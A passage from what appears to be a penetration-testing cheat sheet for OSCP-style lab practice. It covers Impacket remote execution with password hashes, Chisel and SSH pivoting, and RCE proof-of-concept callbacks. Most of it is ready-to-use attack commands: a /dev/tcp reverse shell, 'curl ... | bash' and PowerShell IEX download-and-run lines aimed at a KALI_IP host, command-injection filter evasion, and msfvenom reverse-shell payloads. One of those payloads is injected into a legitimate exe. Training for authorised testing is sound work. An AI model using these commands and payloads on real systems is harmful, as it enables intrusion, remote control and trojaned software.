smbexec.py DOMAIN/ADMIN_USERNAME:ADMIN_PASSWORD@TARGET_IP
smbexec.py DOMAIN/ADMIN_USERNAME@TARGET_IP -hashes NTHASH:NTHASH
# psexec.py for system shell
psexec.py DOMAIN/ADMIN_USERNAME:ADMIN_PASSWORD@TARGET_IP
psexec.py DOMAIN/ADMIN_USERNAME@TARGET_IP -hashes NTHASH:NTHASH
```

## 6. Pivoting and port forwarding
Pivoting and port forwarding allow you to access internal applications or hosts
### Chisel
```bash
# in Kali
./chisel server --reverse --port 9001 --socks5
```
|     |     |
| --- | --- |
| chisel client SERVER_IP:9001 R:80:127.0.0.1:80 | Listen on Kali 80, forward to localhost port 80 on client |
| chisel client SERVER_IP:9001 R:4444:ANOTHER_HOST:80 | Listen on Kali 4444, forward to ANOTHER_HOST(not the connected one) port 80 |
| chisel client SERVER_IP:9001 R:socks | Create SOCKS5 listener on 1080 on Kali, proxy through client, add `socks5 127.0.0.1 1080` to `/etc/proxychains4.conf` |

### SSH port forwarding 
#### 1. Local port forward, doing a local port forward proxy with jump host local port and target port. So that the exploit can go through from jump box to target machine and port
```bash
#execute on KALI
ssh -N Administrator@${JUMP} -p 22 -L 2222:${TARGET}:22
```
#### 2. forward rev shell
```bash
#Execute on jump box
ssh -N user@${ATTACKING_HOST} -p 22 -R 0.0.0.0:443:127.0.0.1:443
```
At this stage you can start a listen on port 443 to catch the rev shell
But remember all LHOST is now the jump box

#### 3. If you need a web server to serve payload
```bash
#Execute on jump box
ssh -N user@${ATTACKING_HOST} -p 22 -L 0.0.0.0:8080:127.0.0.1:8080
```

#### 4. map one remote host port to jump box
```bash
#Executed on jump box
ssh -N -L 0.0.0.0:4455:REMOTE_HOST:445 USER@REMOTE_HOST
```

#### 5. access remote host port via jump box dynamically
```bash
#Execute on jump box
ssh -Nf -D 0.0.0.0:proxy_port USER@REMOTE_HOST
```

#### 6. map one remote port from remote host to kali box via jumpbox(remote port forward)
```bash
#executed on jump box
ssh -Nf -R 127.0.0.1:ANY_UNUSED_PORT:REMOTE_TARGET:TARGET_PORT kali@KALI_IP
```

#### 7. Dynamic remote port forward, use one localhost port to access all remote host ports
```bash
#execute on jump box
ssh -Nf -R Kali_proxy_port(1080) kali@KALI_IP
```

#### 8. When need to access a host via proxy
```bash
# Make sure you have your proxy running correctly
proxychains4 -q YOUR_COMMAND
```

#### SSH control sequence
The SSH control sequence allows you to 
change SSH options after eastablished the connection. 
It is useful if you want to add new port forwarding options in current SSH session.
See this [blog](https://www.sans.org/blog/using-the-ssh-konami-code-ssh-control-sequences/) for details
```bash
# execute in a terminal
# make sure you pressed enter for a new line
# then press ~C, it won't be shown in the terminal but you should see
ssh >
# Then type in your options, e.g. adding a new SOCKS proxy
ssh > -D 1337
# Then press enter again to add the option
```

## 7. Misc
Things that are important concept or PoC techniques but don't related the above categories/are generic 

### RCE PoC
sometimes the website is vulnerable to RCE
but the execution output does not show up on the web page.
We need a way to proof that the RCE is successful to continue on the exploit.
There are multiple ways to do so:

1. If you don't have access to machine (most of the scenario):

    You can PoC with two ways
    
    The first way is setup a nc listener at port 80
    then put your payload as:
    ```bash
    curl/wget YOUR_IP
    ```
    A valid respond should come in:
    ```bash
    # nc -lvnp 80
    listening on [any] 80 ...
    connect to [YOUR_IP] from (UNKNOWN) [TARGET_IP] 50558
    GET / HTTP/1.1
    Host: YOUR_IP
    User-Agent: curl/7.88.1
    Accept: */*
    ```

    Second way is setup a tcpdump listen on whichever 
    network interface you are connected to your target,
    capture only icmp packets
    and put your payload as
    ```
    ping YOUR_IP -c 1
    ```
    A valid respond should look like:
    ```
    # tcpdump -i tun0 icmp
    tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
    listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
    08:55:30.741476 IP TARGET_IP > YOUR_IP: ICMP echo request, id 1, seq 1, length 64
    08:55:30.741652 IP YOUR_IP > TARGET_IP: ICMP echo reply, id 1, seq 1, length 64
    ```

2. You have access to host already, 
    but you need to priv esc as someone else via an internal running application
    
    Except the above PoC technique, you can use the following payload:
    ```
    echo "pwn3d" > /tmp/pwn
    ```
    A valid respond should be a new file is created at /tmp named pwn. 
    Also check the file permission and ownership with `ls -la` to see if 
    the file is owned the by process owner

### Execute reverse shell payload alternative
If you can't execute the reverse shell payload directly 
(maybe some sort of fiilters or firewall rules exist and preventing command injection payload),
try saving you payload into a script file and serving your payload through a http server. 
An example payload `rev.sh` will be like
```
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
```
Then on the server side, use `curl http://IP/rev.sh | bash` 
or similar tool as your injection payload.

### Command injection payload with firewall evasion
Sometimes an application might have firewall or defences in-place as a filter,
it means some special characters might be blocked.
Common command injection special characters are `;"|'&$`

If you found that an application consist of a firewall/defence,
try and see which characters are banned and which are not.
Sometimes it allows `'` but not `"`, vice versa.
Sometimes it allows `;` but not `|`, vice versa.

To test the banned characters, you can try changing the `'` in your 
original payload to `"` and see if it can get through the filter.
This can also apply to all special characters.
Let's say if `;` is blocked, then you may try `|`, `||`, `&&`, etc.

### Starting a windows conptyshell in background (can use it via a web shell to call conptyshell directly)
```cmd
start /B powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://KALI_IP/rev.ps1')"
```

### upgrade linux simple shell to tty shell without python
```bash
script -qc /bin/bash /dev/null 
```

### Python script to create a reverse shell payload
```python
import sys
import base64

payload = 'YOUR_PAYLOAD'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

### Linux ELF binary
```bash
# 32 bit
msfvenom -p linux/x86/shell_reverse_tcp LHOST=KALI_IP LPORT=NC_PORT -f elf -o shell.elf
# 64 bit
msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=NC_PORT -f elf -o shell.elf
```
### Windows EXE binary
```bash
#32 Bit
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=NC_PORT EXIT_FUNC=thread -f exe -o shell32.exe
#64Bit
msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=NC_PORT EXIT_FUNC=thread -f exe -o shell64.exe
```
### Windows Service
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=NC_PORT EXITFUNC=thread -f exe-service -o service.exe
```
### ASP
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=NC_PORT -f asp -o shell.asp
```
### JSP
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI_IP LPORT=NC_PORT -f raw -o shell.jsp
```
### WAR (usually useful for tomcat)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI_IP LPORT=NC_PORT -f war -o shell.war
```
### Inject payload into an existing exe file
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=NC_PORT -x Legit.exe -f exe -o malicious.exe
```

### Decode base64 string in windows (sometime may need it due to special character)
```powershell
$base64String = 'BASE64_STRING'
$bytes = [System.Convert]::FromBase64String($base64String)
$text = [System.Text.Encoding]::UTF8.GetString($bytes)
Write-Output $text
```

### Check if current powershell session is a 64 bit process or not in windows
```powershell
[system.environment]::Is64BitProcess
```
If it is not, invoke 64 bit reverse powershell call
```
C:\Windows\sysNative\windows\powershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://KALI_IP/rev.ps1')
```

### Useful Reverse shell payload 
[Windows Powershell](https://github.com/samratashok/nishang/tree/master/Shells)

[Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

### Upgrade simple shell to tty shell to fully interactive shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
USER@ubuntu:~$ ^Z                    //<- Press Ctrl +Z           
zsh: suspended  nc -lvp 13337
┌──(kali㉿kali)-[~]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvp 13337
                               reset
reset: unknown terminal type unknown
Terminal type? screen
USER@ubuntu:~$ export TERM=xterm
```
For windows, use this [tool](https://github.com/antonioCoco/ConPtyShell)

### When you feel stuck
* Do not rely on autorecon only
* modify the explot script directory path/uri
* List user directories recursively
* check hashes, password reuse
* Try rdp,ssh,winrm with owned creds
* try asrep kerberoast
* Fuzz the found subdirectories with a wordlist and fuzzer
* Check C:\windows\system32\config for SAM and SYSTEM if theres a old version of C:\
* Go for kernel exploit
* Try local auth as admin
* try pivoting/look for internal running application
* Try find vhost
* search about that specific service/service in google but add the keyword "hack the box"
* If a con pty shell does not work for you, try a simple shell/tty shell

### Some other useful cheatsheets or website
* [Windows version GTFOBins](https://lolbas-project.github.io/)
* [AD version GTFOBins](https://wadcoms.github.io/)
* [List of practice machine](https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html)
* [Playlist of ippsec OSCP-like machines walkthrough](https://www.youtube.com/playlist?list=PLidcsTyj9JXK-fnabFLVEvHinQ14Jy5tf)
* [Playlist of ippsec for AD prep](https://www.youtube.com/playlist?list=PLbK3lpDL_g6ChnJ9E8LB30dezPfuzgaBI), probably overkilled but I learnt a lot from it.